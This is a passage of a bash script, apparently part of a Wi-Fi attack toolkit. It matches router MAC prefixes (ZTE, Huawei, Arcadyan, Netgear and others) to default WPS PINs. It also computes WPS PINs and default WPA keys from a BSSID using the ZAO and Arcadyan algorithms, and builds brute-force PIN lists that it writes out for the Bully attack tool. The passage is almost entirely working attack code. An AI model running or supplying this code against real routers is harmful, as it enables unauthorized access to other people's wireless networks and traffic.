F81BFA | F8ED80)        # ZTE -  ZXHN_H108N  pin generico 12345670

DEFAULTSSID="MOVISTAR_XXXX"
FABRICANTE="ZTE"
MODEL="ZXHN_H108N"
ACTIVATED=1
PIN=12345670

;;
E4C146)               # Observa Telecom - Router ADSL (RTA01N_Fase2)

if [ -n "`(echo $ESSID | grep -F MOVISTAR)`" ] ; then

DEFAULTSSID="MOVISTAR_XXXX"
FABRICANTE="Observa Telecom para Objetivos y Servicios de Valor"
MODEL="RTA01N_Fase2"
ACTIVATED=0
PIN=71537573

elif [ -n "`(echo $ESSID | grep -F Vodafone)`" ] ; then

UNKNOWN=2

DEFAULTSSID="VodafoneXXXX"
FABRICANTE="Objetivos y Servicios de Valor"
MODEL="Unknown"
ACTIVATED=1
APRATE=1

else

DEFAULTSSID="MOVISTAR_XXXX or VodafoneXXXX"
FABRICANTE="Objetivos y Servicios de Valor"
MODEL="Unknown"
ACTIVATED=1
SPECIAL=1
PIN=71537573

fi

;;
087A4C | 0C96BF | E8CD2D )

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="HUAWEI"                             ##### HUAWEI HG532s de Orange (españa) 
DEFAULTSSID="Orange-XXXX"
MODEL="HG532s"
ACTIVATED=1

;;
1CC63C | 507E5D | 743170 | 849CA6 | 880355)   # original algorithms by Stefan Wotan-Stefan Viehböck-Coeman76 

FABRICANTE="Arcadyan Technology Corporation"
MODEL="ARV7510PW22"
ACTIVATED=1

if [ -n "`(echo $ESSID | grep -F Vodafone)`" ] ; then

DEFAULTSSID="VodafoneXXXX"
ARCADYAN
CHECKSUM

elif [ -n "`(echo $ESSID | grep -F Orange)`" ] ; then

UNKNOWN=2

else

DEFAULTSSID="VodafoneXXXX ?"
ARCADYAN
CHECKSUM

SPECIAL=1

fi

;;
EC233D )

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="HUAWEI"                             ##### HUAWEI HG532e de Djinouti 
DEFAULTSSID="HG532e-XXXXXX"
MODEL="HG532e"
ACTIVATED=1

;;
001DCF )

PIN=12345670

FABRICANTE="Arris Interactive  L.L.C"                            
DEFAULTSSID="ARRIS-XXXX"
MODEL="DG950A"
ACTIVATED=1

;;
BC1401 | 68B6CF | 00265B )

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="Hitron Technologies"                            
DEFAULTSSID="ONOXXX0"
MODEL="CDE-30364"
ACTIVATED=0

;;
CC5D4E )

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="zyxell"                            
DEFAULTSSID="ZyXEL"
MODEL="WAP 3205"
ACTIVATED=1

;;
C03F0E | A021B7 | 2CB05D | C43DC7 | 841B5E | 008EF2 | 744401 | 30469A | 204E7F )


FABRICANTE="Netgear"
DEFAULTSSID="ONOXXXX"
MODEL="CG3100D"
ACTIVATED=0

UNKNOWN=2

;;
*)
if  [[ $ESSID =~ ^DartyBox_[[:xdigit:]]{3}_[[:xdigit:]]{1}*$ ]]; then

FABRICANTE="BEWAN"
DEFAULTSSID="DartyBox_XXX_X"
MODEL="Bewan iBox V1.0"
ACTIVATED=1
PIN=12345670

else
ZAOMODE                                                                   
CHECKSUM                                                                     

UNKNOWN=1

fi
;;
esac
}

CHECKSUM(){
PIN=`expr 10 '*' $STRING`
ACCUM=0
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10000000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 1000000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 100000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 10000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 1000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 100 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10 ')' '%' 10 ')'`

DIGIT=`expr $ACCUM '%' 10`
CHECKSUM=`expr '(' 10 '-' $DIGIT ')' '%' 10`

PIN=$(printf '%08d\n' `expr $PIN '+' $CHECKSUM`)
}

ZAOMODE(){
STRING=`expr '(' $CONVERTEDMAC '%' 10000000 ')'`
}

recursive_generator()
{
    if (($1 == 0))                                        
    then 
         echo $2 
    else 
        for car in 0 1 2 3 4 5 6 7 8 9;                                      
        do 
            recursive_generator $(($1 - 1)) $2$car                             
        done                                                                   
    fi                                                                         
}

SEQUENCEFIRST()
{
if [ "$INICIOSEQUENCEFIRST" -gt "$FINSEQUENCEFIRST" ]; then
  for i in $(seq $FINSEQUENCEFIRST $INICIOSEQUENCEFIRST)  ;
    do
      printf '%04d\n' $i
  done | tac  2> /dev/null
else
  for i in $(seq $INICIOSEQUENCEFIRST $FINSEQUENCEFIRST)  ;
    do
      printf '%04d\n' $i
  done 2> /dev/null
fi
}

SEQUENCESECOND()
{
if [ "$INICIOSEQUENCESECOND" -gt "$FINSEQUENCESECOND" ]; then
  for i in $(seq $FINSEQUENCESECOND $INICIOSEQUENCESECOND)  ;
    do
      printf '%03d\n' $i
  done | tac  2> /dev/null
else
for i in $(seq $INICIOSEQUENCESECOND $FINSEQUENCESECOND)  ;
    do
      printf '%03d\n' $i
  done 2> /dev/null 
fi
}

BASICPINGENERATOR()
{
echo "$FIRSTHALFSESSION"
SEQUENCEFIRST 2> /dev/null
echo "$STARTSELECTEDPIN
$PART1
$STARTPIN
$STARTPIN2
$STARTPIN3
$STARTPIN4
$STARTPIN5
$STARTPIN6
$STARTPIN7
$STARTPIN8
1234
1186
8847
1883
2017
1653
1670
1835
8820
7376
4329
1975
1340
2032
4394
4739"
recursive_generator 4
echo "$SECONDHALFSESSION"
SEQUENCESECOND 2> /dev/null
echo "$ENDSELECTEDPIN
$PART2
$ENDPIN
$ENDPIN2
$ENDPIN3
$ENDPIN4
$ENDPIN5
$ENDPIN6
$ENDPIN7
$ENDPIN8
567
642
876
648
252
806
273
560
290
705
791
696
970
976
455
271"  
recursive_generator 3
}

ARCADYAN(){

## "Take the last 2 Bytes of the MAC-Address (0B:EC), and convert it to decimal." < original quote from easybox_keygen.sh
deci=($(printf "%04d" "0x`(echo $BSSID | cut -d ':' -f5,6 | tr -d ':')`" | sed 's/.*\(....\)/\1/;s/./& /g')) # supression of $take5 and $last4 compared with esaybox code, the job is directly done in the array value assignation, also the variable $MAC has been replaced by $BSSID taht is used in WPSPIN
## "The digits M9 to M12 are just the last digits (9.-12.) of the MAC:" < original quote from easybox_keygen.sh
hexi=($(echo ${BSSID:12:5} | sed 's/://;s/./& /g')) ######unchanged
## K1 = last byte of (d0 + d1 + h2 + h3) < original quote from easybox_keygen.sh
## K2 = last byte of (h0 + h1 + d2 + d3) < original quote from easybox_keygen.sh
c1=$(printf "%d + %d + %d + %d" ${deci[0]} ${deci[1]} 0x${hexi[2]} 0x${hexi[3]})  ######unchanged
c2=$(printf "%d + %d + %d + %d" 0x${hexi[0]} 0x${hexi[1]} ${deci[2]} ${deci[3]})  ######unchanged
K1=$((($c1)%16))  ######unchanged
K2=$((($c2)%16))  ######unchanged
X1=$((K1^${deci[3]}))  ######unchanged
X2=$((K1^${deci[2]}))  ######unchanged
X3=$((K1^${deci[1]}))  ######unchanged
Y1=$((K2^0x${hexi[1]}))  ######unchanged
Y2=$((K2^0x${hexi[2]}))  ######unchanged
Y3=$((K2^0x${hexi[3]}))  ######unchanged
Z1=$((0x${hexi[2]}^${deci[3]}))  ######unchanged
Z2=$((0x${hexi[3]}^${deci[2]}))  ######unchanged
Z3=$((K1^K2))  ######unchanged
STRING=$(printf '%08d\n' `echo $((0x$X1$X2$Y1$Y2$Z1$Z2$X3))` | rev | cut -c -7 | rev) # this to genrate later our PIN, the 7 first digit  
DEFAULTWPA=$(printf "%x%x%x%x%x%x%x%x%x\n" $X1 $Y1 $Z1 $X2 $Y2 $Z2 $X3 $Y3 $Z3 | tr a-f A-F | tr 0 1) # the change respected to the original script in the most important thing, the default pass, is the adaptation of Coeman76's work on spanish vodafone where he found out that no 0 where used in the final pass
DEFAULTSSID=$(echo "Vodafone-`echo "$BSSID" | cut -d ':' -f5,6 | tr -d ':' | tr 0 G`")  # the modification of the algorithm in this line is also a contribution of lampiweb forum, for default ssid if there should be a zero it is replaced by G 
}

OUTPUT(){

echo $PIN > /usr/share/FS3/Temp_Working_Dirctory/Bully_And_Pin_$FolderName/Pins.txt
echo $PIN1 >> /usr/share/FS3/Temp_Working_Dirctory/Bully_And_Pin_$FolderName/Pins.txt
echo $PIN2 >> /usr/share/FS3/Temp_Working_Dirctory/Bully_And_Pin_$FolderName/Pins.txt
echo $PIN3 >> /usr/share/FS3/Temp_Working_Dirctory/Bully_And_Pin_$FolderName/Pins.txt
echo $PIN4 >> /usr/share/FS3/Temp_Working_Dirctory/Bully_And_Pin_$FolderName/Pins.txt
echo $PIN5 >> /usr/share/FS3/Temp_Working_Dirctory/Bully_And_Pin_$FolderName/Pins.txt
echo $PIN6 >> /usr/share/FS3/Temp_Working_Dirctory/Bully_And_Pin_$FolderName/Pins.txt
echo $PIN7 >> /usr/share/FS3/Temp_Working_Dirctory/Bully_And_Pin_$FolderName/Pins.txt
echo $PIN8 >> /usr/share/FS3/Temp_Working_Dirctory/Bully_And_Pin_$FolderName/Pins.txt
sed -i '/./!d' /usr/share/FS3/Temp_Working_Dirctory/Bully_And_Pin_$FolderName/Pins.txt

}

DATASGENERADOR(){
echo ""
ESSID=$(cat /usr/share/FS3/Temp_Working_Dirctory/Chosen_AP_Line.txt | awk '{ print $1 }' | sed -e 's/+/ /g')
BSSID=$(cat /usr/share/FS3/Temp_Working_Dirctory/Chosen_AP_Line.txt | awk '{ print $2 }')
echo "  "
while !(echo $BSSID | tr a-f A-F | egrep -q "^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$")
do
echo ""            
done
}

DATASGENERADOR
GENERATE
OUTPUT

}
##################################### WPSPIN-1.5 Generater #####################################

monX_Detection
